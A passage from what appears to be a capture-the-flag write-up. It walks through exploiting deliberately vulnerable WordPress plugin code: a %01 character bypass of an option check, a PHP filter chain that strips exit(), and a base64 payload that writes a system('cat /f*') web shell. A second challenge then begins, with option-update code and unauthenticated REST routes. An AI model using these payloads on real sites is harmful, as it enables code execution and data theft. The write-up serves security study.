+</span></span><span class=line><span class=cl>    <span class=nv>$some_value</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span> <span class=nx>strtolower</span><span class=p>(</span> <span class=nv>$request</span><span class=p>[</span><span class=s1>&#39;somevalue&#39;</span><span class=p>]</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>get_option</span><span class=p>(</span><span class=nv>$some_value</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;blocked&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>();</span> 
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$name</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>105</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;blocked.&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nv>$write</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;</span><span class=dl>EOF</span><span class=s>
+</span></span></span><span class=line><span class=cl><span class=s>        &lt;?php
+</span></span></span><span class=line><span class=cl><span class=s>            exit(&#39;ha?&#39;);
+</span></span></span><span class=line><span class=cl><span class=s>            // $content
+</span></span></span><span class=line><span class=cl><span class=s>
+</span></span></span><span class=line><span class=cl><span class=s>    </span><span class=dl>EOF</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nv>$name</span> <span class=o>.</span> <span class=s1>&#39;.php&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nv>$write</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$name</span> <span class=o>.</span> <span class=s1>&#39;.php&#39;</span><span class=p>,</span> <span class=nv>$write</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>rest_ensure_response</span><span class=p>(</span> <span class=s2>&#34;success&#34;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The plugin defined one Rest API endpoint that will call <code>upload_something</code> function if <code>check_request</code> is True.</p><p><code>check_request</code> will search if there&rsquo;s request parameter named <code>somevalue</code>, then check if it&rsquo;s started with <code>secretword_</code> and also check if the value is exactly <code>secretword_is_true</code></p><p>sound simple, right? param value such as <code>secretword_is_false</code> can be used to pass this checking.</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-30.png width=1550 height=506 loading=lazy class=gallery-image data-flex-grow=306 data-flex-basis=735px></p><p>let&rsquo;s continue with the callback function. It will read JSON POST data, then try to search for <code>somevalue</code> properties (doesn&rsquo;t matter if it&rsquo;s in URL Param or JSON Body). It will try to get options for the <code>somevalue</code> and check if there&rsquo;s any. It also checks the length <code>name</code> properties.</p><p>If all the requirement fullfilled, then it will put user&rsquo;s <code>content</code> properties, and write it into user defined <code>$name</code> properties, with the extension of <code>.php</code></p><p>so here we have a problem:</p><ol><li>First of all, there&rsquo;s option named <code>secretword_is_true</code>. We <strong>must</strong> use this as the <code>somevalue</code> params so we can pass the checking in <code>upload_something</code>. However if we doing so, then we can&rsquo;t pass the restriction set in <code>check_request</code>.</li><li>altough we can control the filename of the uploaded file, we can&rsquo;t really execute php code. This is due to <code>exit</code> code in the content of the uploaded files. No matter the content we provide, it wont be executed.</li></ol><p>so, how can we solve the problem?</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-28.png width=787 height=911 loading=lazy class=gallery-image data-flex-grow=86 data-flex-basis=207px></p><p>After trying different method and approach, i suddenly remember that mysql doesn&rsquo;t really care about nullbyte characters (%00).
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-29.png width=613 height=468 loading=lazy class=gallery-image data-flex-grow=130 data-flex-basis=314px></p><p>but due to usage of <code>trim</code> function in the plugin, we can&rsquo;t use nullbyte characters 😥
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-31.png width=1549 height=514 loading=lazy class=gallery-image data-flex-grow=301 data-flex-basis=723px></p><p>Here&rsquo;s the interesting part. When i try other characters, such as %01, suddenly it worked!
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-32.png width=1547 height=514 loading=lazy class=gallery-image data-flex-grow=300 data-flex-basis=722px></p><p>I&rsquo;m not sure which part (either wordpress or the database) is responsible for this tricks to be happend. But let&rsquo;s say it&rsquo;s because database were ignoring the %01 character, just like it ignoring %00.</p><p>Ok, so now we need to solve the second problem. How can we achieve code execution if the php script use <code>exit</code> function?</p><p>well apparently it&rsquo;s a well known tricks that&rsquo;ve been lying in the internet for long time. I accidentaly found the solution from <a class=link href=https://github.com/SniperOJ/Jeopardy-Dockerfiles/tree/master/web/bypass-php-exit target=_blank rel=noopener>chinese CTF writeup</a></p><p>The solution was using php filter chain to remove all php tags, and then perform base64 decode to our payload. So in the end, the <code>exit()</code> code will be deleted.</p><p>to make it easier to understand, here&rsquo;s the chain workflow.</p><blockquote><p>Original PHP Code</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s1>&#39;ha?&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// YOUR PAYLOAD GOES HERE
+</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>PHP Code after append. Content = <code>?>\nPD9waHAgc3lzdGVtKCdjYXQgL2YqJyk7Pz4K</code></p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s1>&#39;ha?&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// 
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>?&gt;</span><span class=err>PD9waHAgc3lzdGVtKCdjYXQgL2YqJyk7Pz4K
+</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>Then when the <code>file_put_contents</code> try to write the file, it will delete the previous tags</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>PD9waHAgc3lzdGVtKCdjYXQgL2YqJyk7Pz4K</span> <span class=c1># not deleted because located outside of php tags
+</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>Finally will perform base64 decode</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;cat /f*&#39;</span><span class=p>);</span><span class=cp>?&gt;</span><span class=err> # final content written to file
+</span></span></span></code></pre></td></tr></table></div></div><p>Then we can access the uploaded content, and retrieve the flag
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-33.png width=1544 height=558 loading=lazy class=gallery-image data-flex-grow=276 data-flex-basis=664px></p><p>Flag obtained!
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-34.png width=1543 height=459 loading=lazy class=gallery-image data-flex-grow=336 data-flex-basis=806px></p><p><strong>Flag: CTF{you_bypass_the_exit_nice_8b31009122dd}</strong></p><hr><h3 id=up-to-you>Up To You</h3><blockquote><p>it&rsquo;s all up to you.</p><p>NOTE: This is a fully white box challenge, almost no heavy brute force is needed.</p></blockquote><p>In this challenge, we were given three plugins. Flag is saved in the private posts. So the objective is to leak private post.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-35.png width=953 height=275 loading=lazy class=gallery-image data-flex-grow=346 data-flex-basis=831px></p><p>Let&rsquo;s started with custom plugins named <code>test-plugin</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=o>!</span> <span class=nx>defined</span><span class=p>(</span> <span class=s1>&#39;WPINC&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>die</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_PLUGIN_NAME&#39;</span><span class=p>,</span> <span class=s1>&#39;test-plugin&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_VERSION&#39;</span><span class=p>,</span> <span class=s1>&#39;1.0.0&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_URL&#39;</span><span class=p>,</span> <span class=nx>plugin_dir_url</span><span class=p>(</span> <span class=no>__FILE__</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_PATH&#39;</span><span class=p>,</span> <span class=nx>plugin_dir_path</span><span class=p>(</span> <span class=no>__FILE__</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_BASE_DIR&#39;</span><span class=p>,</span> <span class=nx>plugin_dir_path</span><span class=p>(</span> <span class=no>__FILE__</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;PLUGIN_NAME_BASE_NAME&#39;</span><span class=p>,</span> <span class=nx>plugin_basename</span><span class=p>(</span> <span class=no>__FILE__</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s2>&#34;wp_ajax_nopriv_uptoyou&#34;</span><span class=p>,</span> <span class=s2>&#34;uptoyou&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>uptoyou</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$option_name</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;option_name&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$nope</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;users_can_register&#39;</span><span class=p>,</span> <span class=s1>&#39;auto_update_core_minor&#39;</span><span class=p>,</span> <span class=s1>&#39;auto_update_core_dev&#39;</span><span class=p>,</span> <span class=s1>&#39;upload_url_path&#39;</span><span class=p>,</span> <span class=s1>&#39;mailserver_pass&#39;</span><span class=p>,</span> <span class=s1>&#39;wp_user_roles&#39;</span><span class=p>,</span> <span class=s1>&#39;template&#39;</span><span class=p>,</span> <span class=s1>&#39;blog_public&#39;</span><span class=p>,</span> <span class=s1>&#39;html_type&#39;</span><span class=p>,</span> <span class=s1>&#39;sticky_posts&#39;</span><span class=p>,</span> <span class=s1>&#39;use_balanceTags&#39;</span><span class=p>,</span> <span class=s1>&#39;page_for_posts&#39;</span><span class=p>,</span> <span class=s1>&#39;permanent-links&#39;</span><span class=p>,</span> <span class=s1>&#39;hack_file&#39;</span><span class=p>,</span> <span class=s1>&#39;multisite&#39;</span><span class=p>,</span> <span class=s1>&#39;comment_max_links&#39;</span><span class=p>,</span> <span class=s1>&#39;mailserver_login&#39;</span><span class=p>,</span> <span class=s1>&#39;use_trackback&#39;</span><span class=p>,</span> <span class=s1>&#39;comments_per_page&#39;</span><span class=p>,</span> <span class=s1>&#39;default_pingback_flag&#39;</span><span class=p>,</span> <span class=s1>&#39;siteurl&#39;</span><span class=p>,</span> <span class=s1>&#39;enable_app&#39;</span><span class=p>,</span> <span class=s1>&#39;large_size_w&#39;</span><span class=p>,</span> <span class=s1>&#39;default_comments_page&#39;</span><span class=p>,</span> <span class=s1>&#39;default_comment_status&#39;</span><span class=p>,</span> <span class=s1>&#39;links&#39;</span><span class=p>,</span> <span class=s1>&#39;moderation_keys&#39;</span><span class=p>,</span> <span class=s1>&#39;sidebars_widgets&#39;</span><span class=p>,</span> <span class=s1>&#39;posts_per_page&#39;</span><span class=p>,</span> <span class=s1>&#39;links_updated_date_format&#39;</span><span class=p>,</span> <span class=s1>&#39;default_role&#39;</span><span class=p>,</span> <span class=s1>&#39;theme&#39;</span><span class=p>,</span> <span class=s1>&#39;advanced_edit&#39;</span><span class=p>,</span> <span class=s1>&#39;image_default_link_type&#39;</span><span class=p>,</span> <span class=s1>&#39;blogname&#39;</span><span class=p>,</span> <span class=s1>&#39;thumbnail_size_w&#39;</span><span class=p>,</span> <span class=s1>&#39;admin_email&#39;</span><span class=p>,</span> <span class=s1>&#39;enable_xmlrpc&#39;</span><span class=p>,</span> <span class=s1>&#39;rss_use_excerpt&#39;</span><span class=p>,</span> <span class=s1>&#39;require_name_email&#39;</span><span class=p>,</span> <span class=s1>&#39;comment_whitelist&#39;</span><span class=p>,</span> <span class=s1>&#39;medium_large_size_h&#39;</span><span class=p>,</span> <span class=s1>&#39;show_comments_cookies_opt_in&#39;</span><span class=p>,</span> <span class=s1>&#39;comment_order&#39;</span><span class=p>,</span> <span class=s1>&#39;use_balancetags&#39;</span><span class=p>,</span> <span class=s1>&#39;close_comments_for_old_posts&#39;</span><span class=p>,</span> <span class=s1>&#39;gzipcompression&#39;</span><span class=p>,</span> <span class=s1>&#39;use_smilies&#39;</span><span class=p>,</span> <span class=s1>&#39;upload_path&#39;</span><span class=p>,</span> <span class=s1>&#39;moderation_notify&#39;</span><span class=p>,</span> <span class=s1>&#39;close_comments_days_old&#39;</span><span class=p>,</span> <span class=s1>&#39;medium_size_w&#39;</span><span class=p>,</span> <span class=s1>&#39;show_on_front&#39;</span><span class=p>,</span> <span class=s1>&#39;reading&#39;</span><span class=p>,</span> <span class=s1>&#39;show_avatars&#39;</span><span class=p>,</span> <span class=s1>&#39;default_post_format&#39;</span><span class=p>,</span> <span class=s1>&#39;site_icon&#39;</span><span class=p>,</span> <span class=s1>&#39;comments_notify&#39;</span><span class=p>,</span> <span class=s1>&#39;adminhash&#39;</span><span class=p>,</span> <span class=s1>&#39;gmt_offset&#39;</span><span class=p>,</span> <span class=s1>&#39;rewrite_rules&#39;</span><span class=p>,</span> <span class=s1>&#39;rss_language&#39;</span><span class=p>,</span> <span class=s1>&#39;thread_comments_depth&#39;</span><span class=p>,</span> <span class=s1>&#39;permalink_structure&#39;</span><span class=p>,</span> <span class=s1>&#39;default_category&#39;</span><span class=p>,</span> <span class=s1>&#39;links_recently_updated_append&#39;</span><span class=p>,</span> <span class=s1>&#39;thread_comments&#39;</span><span class=p>,</span> <span class=s1>&#39;home&#39;</span><span class=p>,</span> <span class=s1>&#39;widget_categories&#39;</span><span class=p>,</span> <span class=s1>&#39;use_linksupdate&#39;</span><span class=p>,</span> <span class=s1>&#39;default_post_edit_rows&#39;</span><span class=p>,</span> <span class=s1>&#39;comment_moderation&#39;</span><span class=p>,</span> <span class=s1>&#39;start_of_week&#39;</span><span class=p>,</span> <span class=s1>&#39;wp_page_for_privacy_policy&#39;</span><span class=p>,</span> <span class=s1>&#39;date_format&#39;</span><span class=p>,</span> <span class=s1>&#39;widget_text&#39;</span><span class=p>,</span> <span class=s1>&#39;active_plugins&#39;</span><span class=p>,</span> <span class=s1>&#39;avatar_default&#39;</span><span class=p>,</span> <span class=s1>&#39;timezone_string&#39;</span><span class=p>,</span> <span class=s1>&#39;auto_update_core_major&#39;</span><span class=p>,</span> <span class=s1>&#39;default_ping_status&#39;</span><span class=p>,</span> <span class=s1>&#39;tag_base&#39;</span><span class=p>,</span> <span class=s1>&#39;media&#39;</span><span class=p>,</span> <span class=s1>&#39;widget_rss&#39;</span><span class=p>,</span> <span class=s1>&#39;general&#39;</span><span class=p>,</span> <span class=s1>&#39;time_format&#39;</span><span class=p>,</span> <span class=s1>&#39;large_size_h&#39;</span><span class=p>,</span> <span class=s1>&#39;others&#39;</span><span class=p>,</span> <span class=s1>&#39;embed_size_w&#39;</span><span class=p>,</span> <span class=s1>&#39;posts_per_rss&#39;</span><span class=p>,</span> <span class=s1>&#39;image_default_size&#39;</span><span class=p>,</span> <span class=s1>&#39;mailserver_url&#39;</span><span class=p>,</span> <span class=s1>&#39;fileupload_maxk&#39;</span><span class=p>,</span> <span class=s1>&#39;page_comments&#39;</span><span class=p>,</span> <span class=s1>&#39;links_recently_updated_time&#39;</span><span class=p>,</span> <span class=s1>&#39;thumbnail_size_h&#39;</span><span class=p>,</span> <span class=s1>&#39;page_on_front&#39;</span><span class=p>,</span> <span class=s1>&#39;uploads_use_yearmonth_folders&#39;</span><span class=p>,</span> <span class=s1>&#39;ping_sites&#39;</span><span class=p>,</span> <span class=s1>&#39;comment_registration&#39;</span><span class=p>,</span> <span class=s1>&#39;thumbnail_crop&#39;</span><span class=p>,</span> <span class=s1>&#39;medium_large_size_w&#39;</span><span class=p>,</span> <span class=s1>&#39;recently_edited&#39;</span><span class=p>,</span> <span class=s1>&#39;image_default_align&#39;</span><span class=p>,</span> <span class=s1>&#39;avatar_rating&#39;</span><span class=p>,</span> <span class=s1>&#39;links_recently_updated_prepend&#39;</span><span class=p>,</span> <span class=s1>&#39;new_admin_email&#39;</span><span class=p>,</span> <span class=s1>&#39;comments&#39;</span><span class=p>,</span> <span class=s1>&#39;embed_size_h&#39;</span><span class=p>,</span> <span class=s1>&#39;default_email_category&#39;</span><span class=p>,</span> <span class=s1>&#39;embed_autourls&#39;</span><span class=p>,</span> <span class=s1>&#39;stylesheet&#39;</span><span class=p>,</span> <span class=s1>&#39;blacklist_keys&#39;</span><span class=p>,</span> <span class=s1>&#39;https_detection_errors&#39;</span><span class=p>,</span> <span class=s1>&#39;medium_size_h&#39;</span><span class=p>,</span> <span class=s1>&#39;category_base&#39;</span><span class=p>,</span> <span class=s1>&#39;blogdescription&#39;</span><span class=p>,</span> <span class=s1>&#39;avatars&#39;</span><span class=p>,</span> <span class=s1>&#39;mailserver_port&#39;</span><span class=p>,</span> <span class=s1>&#39;default_link_category&#39;</span><span class=p>,</span> <span class=s1>&#39;secret&#39;</span><span class=p>,</span> <span class=s1>&#39;writing&#39;</span><span class=p>,</span> <span class=s1>&#39;blog_charset&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$option_name</span><span class=p>,</span> <span class=nv>$nope</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>update_option</span><span class=p>(</span><span class=nv>$option_name</span><span class=p>,</span> <span class=nx>wp_json_encode</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;option_value&#34;</span><span class=p>]));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;option updated&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The plugin only containing this single file. It will register ajax action where we can update any options in the wordpress. However the value was in JSON format due to <code>wp_json_encode</code> function.</p><p>due to json encode, we can&rsquo;t enable options that require integer value such as <code>users_can_register</code>. We also can&rsquo;t controll options that require string format becausee <code>wp_json_encode</code> always gives additional double quote in the database.</p><p>There were a lot of blacklisted options. But as we solve previous challenges, we know that we can also bypass the blacklist using %01 or \u0001 characters.</p><p>That&rsquo;s all for the custom plugin, now let&rsquo;s analyze the other two plugins. Here we found a lot of WP Rest route, but rest api from <code>slim-seo</code> is protected by role and permissions.
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-36.png width=574 height=920 loading=lazy class=gallery-image data-flex-grow=62 data-flex-basis=149px></p><p>Since we dont have any credentials, and we can&rsquo;t register, we can only search for unauthenticated rest. Luckily, rest api from <code>squirrly-seo</code> doesn&rsquo;t check for permissions.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>hookInit</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nx>SQ_Classes_Helpers_Tools</span><span class=o>::</span><span class=na>getOption</span><span class=p>(</span> <span class=s1>&#39;sq_api&#39;</span> <span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span> <span class=nx>SQ_Classes_Helpers_Tools</span><span class=o>::</span><span class=na>getOption</span><span class=p>(</span> <span class=s1>&#39;sq_cloud_connect&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>token</span> <span class=o>=</span> <span class=nx>SQ_Classes_Helpers_Tools</span><span class=o>::</span><span class=na>getOption</span><span class=p>(</span> <span class=s1>&#39;sq_cloud_token&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>//Change the rest api if needed
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>add_action</span><span class=p>(</span> <span class=s1>&#39;rest_api_init&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span> <span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;sqApiInit&#39;</span> <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>sqApiInit</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nx>function_exists</span><span class=p>(</span> <span class=s1>&#39;register_rest_route&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>register_rest_route</span><span class=p>(</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>namespace</span><span class=p>,</span> <span class=s1>&#39;/indexnow/&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;methods&#39;</span>             <span class=o>=&gt;</span> <span class=nx>WP_REST_Server</span><span class=o>::</span><span class=na>EDITABLE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;callback&#39;</span>            <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span> <span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;indexUrl&#39;</span> <span class=p>),</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;permission_callback&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;__return_true&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>register_rest_route</span><span class=p>(</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>namespace</span><span class=p>,</span> <span class=s1>&#39;/save/&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;methods&#39;</span>             <span class=o>=&gt;</span> <span class=nx>WP_REST_Server</span><span class=o>::</span><span class=na>EDITABLE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;callback&#39;</span>            <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span> <span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;savePost&#39;</span> <span class=p>),</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;permission_callback&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;__return_true&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>register_rest_route</span><span class=p>(</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>namespace</span><span class=p>,</span> <span class=s1>&#39;/get/&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;methods&#39;</span>             <span class=o>=&gt;</span> <span class=nx>WP_REST_Server</span><span class=o>::</span><span class=na>READABLE</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;callback&#39;</span>            <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span> <span class=nv>$this</span><span class=p>,</span> <span class=s1>&#39;getData&#39;</span> <span class=p>),</span>
